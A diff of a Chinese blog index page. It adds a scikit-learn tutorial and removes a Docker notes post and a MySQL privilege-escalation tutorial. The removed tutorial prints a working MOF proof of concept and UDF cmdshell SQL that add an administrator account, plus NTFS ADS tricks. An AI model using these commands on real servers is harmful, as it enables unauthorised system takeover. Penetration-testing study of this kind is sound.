+<li>上面的代码从sklearn的数据库导入了鸢尾花数据集，然后将data作为特征，target作为标签。</li>
+<li>然后通过train_test_split方法将特征和标签分成训练集和测试集并打乱顺序，其中test_size控制测试集占比0.25。</li>
+<li>然后使用KNeighborsClassifier机器学习方法，学习训练集，并用训练好的模型预测测试集中x_test对应的分类结果。</li>
+<li>最后将预测的分类结果y_predict与原始数据中的分类结果y_test输出后对比</li>
+</ul>
+<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn04.png?raw=true" alt=""></p>
+<p>从最终输出结果可以看到，基本都预测成功了，如果我们样本量更大一点，或许会找到一些错误预测结果。</p>
+<h2 id="0x05-scikit-learn学习与预测（回归问题）"><a href="#0x05-scikit-learn学习与预测（回归问题）" class="headerlink" title="0x05 scikit-learn学习与预测（回归问题）"></a>0x05 scikit-learn学习与预测（回归问题）</h2><p>再使用datasets中提供的自动生成数据的方法来预测一个回归问题。同样先贴代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">from sklearn import datasets</span><br><span class="line">from sklearn.linear_model import LinearRegression</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">example_x,example_y = datasets.make_regression(n_samples=100,n_features=1,n_targets=1,noise=3)</span><br><span class="line"></span><br><span class="line">plt.scatter(example_x,example_y)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line">lr = LinearRegression()</span><br><span class="line">lr.fit(example_x,example_y)</span><br><span class="line"></span><br><span class="line">print(lr.predict(example_x[:5,:]))</span><br><span class="line">print(example_y[:5])</span><br></pre></td></tr></table></figure>
+<ul>
+<li>上面代码中，首先使用make_regression生成随机的回归数据，其中n_samples代表数据数量，n_features代表特征数量，n_targets代表特征数量，noise代表噪声大小</li>
+<li>然后使用matplotlib模块将生成的二维数据绘制出来</li>
+<li>接着使用LinearRegression机器学习方法，学习训练集，并用训练好的模型预测样本中前五个数据</li>
+<li>最后将预测结果与原始数据的标签值输出进行对比</li>
+</ul>
+<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn05.png?raw=true" alt=""></p>
+<p>从二维图形可以看出生成数据的分布。</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn06.png?raw=true" alt=""></p>
+<p>从输出结果可以看出，预测结果基本符合，但是有一定的误差。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/26/机器学习-7-——多分类学习/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1333,1287 +2455,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/05/Docker使用笔记/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/07/05/Docker使用笔记/" itemprop="url">
-                  Docker使用笔记
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-05T14:43:02+08:00">
-                2018-07-05
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/笔记/" itemprop="url" rel="index">
-                    <span itemprop="name">笔记</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/07/05/Docker使用笔记/" class="leancloud_visitors" data-flag-title="Docker使用笔记">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在一些漏洞环境的复现中，docker相比虚拟机要方便的多，而且更节省内存，启动更快。能节约我们非常多时间。对安全研究人员来说，docker是必须掌握的一样工具。</p>
-<h2 id="0x01-docker"><a href="#0x01-docker" class="headerlink" title="0x01 docker"></a>0x01 docker</h2><p>Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从Apache2.0协议开源。</p>
-<p>Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。</p>
-<p>容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。</p>
-<h2 id="0x02-docker安装"><a href="#0x02-docker安装" class="headerlink" title="0x02 docker安装"></a>0x02 docker安装</h2><ul>
-<li>Ubuntu中安装：</li>
-</ul>
-<p><a href="http://www.runoob.com/docker/ubuntu-docker-install.html" target="_blank" rel="noopener">http://www.runoob.com/docker/ubuntu-docker-install.html</a></p>
-<ul>
-<li>Windows中安装：</li>
-</ul>
-<p><a href="http://www.runoob.com/docker/windows-docker-install.html" target="_blank" rel="noopener">http://www.runoob.com/docker/windows-docker-install.html</a></p>
-<p>其中windows10专业版（必须是专业版，其他版本实测可以安装但是无法直接使用linux container模式）可以使用docker for windows、其余的版本安装Docker Toolbox。</p>
-<ul>
-<li>MacOS安装</li>
-</ul>
-<p><a href="http://www.runoob.com/docker/macos-docker-install.html" target="_blank" rel="noopener">http://www.runoob.com/docker/macos-docker-install.html</a></p>
-<h2 id="0x03-更换镜像源"><a href="#0x03-更换镜像源" class="headerlink" title="0x03 更换镜像源"></a>0x03 更换镜像源</h2><p>国内直接访问docker官方镜像源拉取镜像时速度会非常慢，我们需要将docker源切换到阿里镜像源或者网易镜像源。</p>
-<h3 id="源地址获取"><a href="#源地址获取" class="headerlink" title="源地址获取"></a>源地址获取</h3><ul>
-<li>阿里源地址：</li>
-</ul>
-<p>在<a href="https://dev.aliyun.com/search.html登陆自己的阿里云账户，在管理中心-&gt;镜像加速器中会有自己的专属加速地址" target="_blank" rel="noopener">https://dev.aliyun.com/search.html登陆自己的阿里云账户，在管理中心-&gt;镜像加速器中会有自己的专属加速地址</a></p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/docker/docker01.png?raw=true" alt=""></p>
-<ul>
-<li>网易源地址：</li>
-</ul>
-<p><a href="http://hub-mirror.c.163.com" target="_blank" rel="noopener">http://hub-mirror.c.163.com</a></p>
-<h3 id="源地址更换"><a href="#源地址更换" class="headerlink" title="源地址更换"></a>源地址更换</h3><ul>
-<li>Ubuntu中更换：</li>
-</ul>
-<p>修改daemon配置文件/etc/docker/daemon.json</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&apos;EOF&apos;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;http://hub-mirror.c.163.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
-<p>如果要用阿里源，上面的仓库地址使用自己的阿里源专属地址即可。</p>
-<ul>
-<li>Docker for Windows中更换：</li>
-</ul>
-<p>在系统右下角托盘图标内右键菜单选择 Settings，打开配置窗口后左侧导航菜单选择 Docker Daemon。编辑窗口内的JSON串，填写加速器地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;http://hub-mirror.c.163.com&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<ul>
-<li>Docker for Mac中更换：</li>
-</ul>
-<p>右键点击桌面顶栏的 docker 图标，选择 Preferences ，在 Daemon 标签（Docker 17.03 之前版本为 Advanced 标签）下的 Registry mirrors 列表中将<br><a href="http://hub-mirror.c.163.com" target="_blank" rel="noopener">http://hub-mirror.c.163.com</a> 加到”registry-mirrors”的数组里，点击 Apply &amp; Restart按钮，等待Docker重启并应用配置的镜像加速器。</p>
-<ul>
-<li>Docker Toolbox中更换：</li>
-</ul>
-<p>1.在Windows命令行执行docker-machine ssh [machine-name]进入VM bash</p>
-<p>2.sudo vi /var/lib/boot2docker/profile</p>
-<p>3.在–label provider=virtualbox的下一行添加–registry-mirror <a href="https://xxxxxxxx.mirror.aliyuncs.com" target="_blank" rel="noopener">https://xxxxxxxx.mirror.aliyuncs.com</a></p>
-<p>4.重启docker服务：sudo /etc/init.d/docker restart或者重启VM：exit退出VM bash，在Windows命令行中执行docker-machine restart</p>
-<h2 id="0x04-docker基础命令"><a href="#0x04-docker基础命令" class="headerlink" title="0x04 docker基础命令"></a>0x04 docker基础命令</h2><h3 id="查询、下载、日志"><a href="#查询、下载、日志" class="headerlink" title="查询、下载、日志"></a>查询、下载、日志</h3><ul>
-<li>查看docker信息：docker info</li>
-<li>拉取镜像：docker pull &lt;镜像名&gt;</li>
-<li>在线搜索镜像：docker search &lt;镜像名&gt;</li>
-<li>查询本机所有的镜像：docker images </li>
-<li>查看正在运行容器：docker ps</li>
-<li>查看某容器内运行的进程：docker top <container></container></li>
-<li>查询某个容器的所有操作记录：docker logs {容器ID|容器名称}</li>
-</ul>
-<h3 id="删除容器、镜像"><a href="#删除容器、镜像" class="headerlink" title="删除容器、镜像"></a>删除容器、镜像</h3><ul>
-<li>删除单个容器：docker rm &lt;容器名or ID&gt;</li>
-<li>删除单个镜像：docker rmi <id></id></li>
-</ul>
-<h3 id="启动停止容器"><a href="#启动停止容器" class="headerlink" title="启动停止容器"></a>启动停止容器</h3><ul>
-<li>停止某个容器：docker stop &lt;容器名or ID&gt;</li>
-<li>启动某个容器：docker start &lt;容器名or ID&gt;</li>
-<li>杀掉某个容器：docker kill &lt;容器名or ID&gt;</li>
-</ul>
-<h3 id="docker运行容器"><a href="#docker运行容器" class="headerlink" title="docker运行容器"></a>docker运行容器</h3><p>Usage: docker run [OPTIONS] IMAGE [COMMAND] [ARG…]</p>
-<p>其中image为为容器名、options是配置参数、command是命令</p>
-<p>docker的配置参数非常多，我们常用的一般是用docker开启一个命令交互界面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -t -i ubuntu /bin/bash</span><br></pre></td></tr></table></figure></p>
-<p>其中</p>
-<ul>
-<li><p>-t:在新容器内指定一个伪终端或终端。</p>
-</li>
-<li><p>-i:允许你对容器内的标准输入 (STDIN) 进行交互。</p>
-</li>
-</ul>
-<p>更多的参数可以参考：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">-d, --detach=false         指定容器运行于前台还是后台，默认为false     </span><br><span class="line">-i, --interactive=false   打开STDIN，用于控制台交互    </span><br><span class="line">-t, --tty=false            分配tty设备，该可以支持终端登录，默认为false    </span><br><span class="line">-u, --user=&quot;&quot;              指定容器的用户    </span><br><span class="line">-a, --attach=[]            登录容器（必须是以docker run -d启动的容器）  </span><br><span class="line">-w, --workdir=&quot;&quot;           指定容器的工作目录   </span><br><span class="line">-c, --cpu-shares=0        设置容器CPU权重，在CPU共享场景使用    </span><br><span class="line">-e, --env=[]               指定环境变量，容器中可以使用该环境变量    </span><br><span class="line">-m, --memory=&quot;&quot;            指定容器的内存上限    </span><br><span class="line">-P, --publish-all=false    指定容器暴露的端口    </span><br><span class="line">-p, --publish=[]           指定容器暴露的端口   </span><br><span class="line">-h, --hostname=&quot;&quot;          指定容器的主机名    </span><br><span class="line">-v, --volume=[]            给容器挂载存储卷，挂载到容器的某个目录    </span><br><span class="line">--volumes-from=[]          给容器挂载其他容器上的卷，挂载到容器的某个目录  </span><br><span class="line">--cap-add=[]               添加权限，权限清单详见：http://linux.die.net/man/7/capabilities    </span><br><span class="line">--cap-drop=[]              删除权限，权限清单详见：http://linux.die.net/man/7/capabilities    </span><br><span class="line">--cidfile=&quot;&quot;               运行容器后，在指定文件中写入容器PID值，一种典型的监控系统用法    </span><br><span class="line">--cpuset=&quot;&quot;                设置容器可以使用哪些CPU，此参数可以用来容器独占CPU    </span><br><span class="line">--device=[]                添加主机设备给容器，相当于设备直通    </span><br><span class="line">--dns=[]                   指定容器的dns服务器    </span><br><span class="line">--dns-search=[]            指定容器的dns搜索域名，写入到容器的/etc/resolv.conf文件    </span><br><span class="line">--entrypoint=&quot;&quot;            覆盖image的入口点    </span><br><span class="line">--env-file=[]              指定环境变量文件，文件格式为每行一个环境变量    </span><br><span class="line">--expose=[]                指定容器暴露的端口，即修改镜像的暴露端口    </span><br><span class="line">--link=[]                  指定容器间的关联，使用其他容器的IP、env等信息    </span><br><span class="line">--lxc-conf=[]              指定容器的配置文件，只有在指定--exec-driver=lxc时使用    </span><br><span class="line">--name=&quot;&quot;                  指定容器名字，后续可以通过名字进行容器管理，links特性需要使用名字    </span><br><span class="line">--net=&quot;bridge&quot;             容器网络设置:  </span><br><span class="line">                              bridge 使用docker daemon指定的网桥       </span><br><span class="line">                              host    //容器使用主机的网络    </span><br><span class="line">                              container:NAME_or_ID  &gt;//使用其他容器的网路，共享IP和PORT等网络资源    </span><br><span class="line">                              none 容器使用自己的网络（类似--net=bridge），但是不进行配置   </span><br><span class="line">--privileged=false         指定容器是否为特权容器，特权容器拥有所有的capabilities    </span><br><span class="line">--restart=&quot;no&quot;             指定容器停止后的重启策略:  </span><br><span class="line">                              no：容器退出时不重启    </span><br><span class="line">                              on-failure：容器故障退出（返回值非零）时重启   </span><br><span class="line">                              always：容器退出时总是重启    </span><br><span class="line">--rm=false                 指定容器停止后自动删除容器(不支持以docker run -d启动的容器)    </span><br><span class="line">--sig-proxy=true           设置由代理接受并处理信号，但是SIGCHLD、SIGSTOP和SIGKILL不能被代理</span><br></pre></td></tr></table></figure></p>
-<h3 id="docker提交容器副本"><a href="#docker提交容器副本" class="headerlink" title="docker提交容器副本"></a>docker提交容器副本</h3><p>我们一般对一个容器进行更改之后，想要保留它下次再使用，可以使用commit命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit -m=&quot;update&quot; -a=&quot;leticia&quot; &lt;容器id&gt; &lt;新的容器名&gt;</span><br></pre></td></tr></table></figure></p>
-<p>其中</p>
-<ul>
-<li>-m是提交时的更新信息。</li>
-<li>-a是作者名。</li>
-</ul>
-<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>docker的命令还有非常多，但是我们只需要掌握上面的一些命令，就可以在每次需要搭建漏洞环境时，从网络上寻找别人配置好的镜像拉取下来使用，能够节约非常多的时间。而且如果你的设备配置不是很高的话，docker在物理机中运行也远远比运行一个完整的虚拟机要流畅的多。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/02/mysql数据库提权总结/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/07/02/mysql数据库提权总结/" itemprop="url">
-                  mysql数据库提权总结
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-02T10:34:30+08:00">
-                2018-07-02
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/07/02/mysql数据库提权总结/" class="leancloud_visitors" data-flag-title="mysql数据库提权总结">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>数据库提权是提权中比较常用的手段，并且sql注入漏洞相对较多，比较好入手，这次整理一下mysql数据库提权的常用手段。</p>
-<h2 id="0x01-MOF提权"><a href="#0x01-MOF提权" class="headerlink" title="0x01 MOF提权"></a>0x01 MOF提权</h2><h3 id="MOF文件"><a href="#MOF文件" class="headerlink" title="MOF文件"></a>MOF文件</h3><p>MOF文件是mysql数据库的扩展文件（在c:/windows/system32/wbem/mof/nullevt.mof）叫做”托管对象格式”，其作用是每隔五秒就会去监控进程创建和死亡。</p>
-<h3 id="MOF提权原理"><a href="#MOF提权原理" class="headerlink" title="MOF提权原理"></a>MOF提权原理</h3><p>MOF文件既然每五秒就会执行，而且是系统权限，我们通过mysql将文件写入一个MOF文件替换掉原有的MOF文件，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。</p>
-<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
-<li>Windows&lt;=2003</li>
-<li>mysql在c:windows/system32/mof目录有写权限</li>
-<li>已知数据库账号密码</li>
-</ul>
-<p>我们可以看到，这个提权方式条件非常严苛，数据库在system32写文件这个条件一般很难达到。而且较新的系统就无法使用MOF提权了。</p>
-<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>这里提供一个poc,需要更改的部分只有一条命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace = &quot;Root\\Cimv2&quot;;</span><br><span class="line">Name = &quot;filtP2&quot;;</span><br><span class="line">Query = &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">&quot;And TargetInstance.Second = 5&quot;;</span><br><span class="line">QueryLanguage = &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name = &quot;consPCSV2&quot;;</span><br><span class="line">ScriptingEngine = &quot;JScript&quot;;</span><br><span class="line">ScriptText =</span><br><span class="line">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user test 123456 /add\&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer = $Consumer;</span><br><span class="line">Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>确保了前面的条件之后，我们可以先上传我们的mof文件到服务器任意目录，一般是网站允许上传的目录。</p>
-<p>然后通过mysql语句将这个文件导入到nullevt.mof<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&quot;F:/wamp/www/upload/test.mof&quot;) into dumpfile &quot;c:/windows/system32/wbem/mof/nullevt.mof&quot;</span><br></pre></td></tr></table></figure></p>
-<p>这里用到了dumpfile而不是outfile是因为：</p>
-<ul>
-<li>dumpfile只能导出一行数据</li>
-<li>outfile可以完整的导出每行记录，并且会在行末端写入新行，并且会转义换行符。</li>
-</ul>
-<p>如果用outfile这个二进制可执行文件就会被破坏，所以这里我们使用了dumpfile。</p>
-<p>然后我们分别两次将创建用户和提权命令替换poc中的命令做上述操作即可。两次使用的命令如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net.exe user test 123456 /add</span><br><span class="line"></span><br><span class="line">net.exe user localgroup administrators test /add</span><br></pre></td></tr></table></figure></p>
-<p>然后我们使用net user命令就可以看到我们新加入的账户，提权成功。</p>
-<h3 id="应对"><a href="#应对" class="headerlink" title="应对"></a>应对</h3><ul>
-<li>最根本的防御是过滤sql注入</li>
-<li>如果一旦被MOF提权，这个语句会被一直执行，要彻底删掉账号需要先停止加载工作，然后删掉文件，再删掉入侵者留下的账号，最后重启服务即可。  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net stop winmgmt</span><br><span class="line">del c:/windows/system32/wbem/repository</span><br><span class="line">net start winmgmt</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<h2 id="0x02-UDF提权"><a href="#0x02-UDF提权" class="headerlink" title="0x02 UDF提权"></a>0x02 UDF提权</h2><h3 id="UDF"><a href="#UDF" class="headerlink" title="UDF"></a>UDF</h3><p>UDF,user defined funcion,即用户自定义函数。用户可以通过自己增加函数对mysql功能进行扩充，文件后缀为.dll。</p>
-<h3 id="UDF提权原理"><a href="#UDF提权原理" class="headerlink" title="UDF提权原理"></a>UDF提权原理</h3><p>通过添加用户自定义函数导出dll，然后在mysql中使用用户自定义函数以高权限账号执行命令，添加账号进行提权。</p>
-<h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
-<li>windows2003、windowsXP、windows7</li>
-<li>拥有mysql的insert和delete权限</li>
-</ul>
-<h3 id="UDF-php"><a href="#UDF-php" class="headerlink" title="UDF.php"></a>UDF.php</h3><p><a href="https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php" target="_blank" rel="noopener">https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php</a></p>
-<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>首先我们要判断mysql版本，根据不同的版本：</p>
-<ul>
-<li><p>mysql版本 &lt; 5.2 , UDF导出到系统目录c:/windows/system32/</p>
-</li>
-<li><p>mysql版本 &gt; 5.2 ，UDF导出到安装路径MySQL\Lib\Plugin\</p>
-</li>
-</ul>
-<p>也可以直接查询插件安装目录：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like %plugin%</span><br></pre></td></tr></table></figure></p>
-<p>然后我们上传udf.php到网站中</p>
-<p>在udf.php中将udf.dll导出到插件目录</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv01.png?raw=true" alt=""></p>
-<p>然后执行sql语句创建用户自定义函数,并利用他执行命令提权<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create function cmdshell returns string soname &apos;udf.dll&apos;;</span><br><span class="line">select cmdshell(&apos;net user test 123456 /add&apos;);</span><br><span class="line">select cmdshell(&apos;net localgroup administrators test /add&apos;);</span><br><span class="line">drop function cmdshell; 删除函数</span><br><span class="line">delete from mysql.func where name=&apos;cmdshell&apos;  删除函数</span><br></pre></td></tr></table></figure></p>
-<p>在将udf.dll文件导出到lib\plugin目录下时，如果plugin不存在，可以用NTFS ADS流来创建文件夹并导入dll<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir;   </span><br><span class="line">//查找到mysql的目录</span><br><span class="line">select &apos;It is dll&apos; into dumpfile &apos;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&apos;;   </span><br><span class="line">//利用NTFS ADS创建lib目录</span><br><span class="line">select &apos;It is dll&apos; into dumpfile &apos;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&apos;;</span><br><span class="line">//利用NTFS ADS创建plugin目录</span><br></pre></td></tr></table></figure></p>
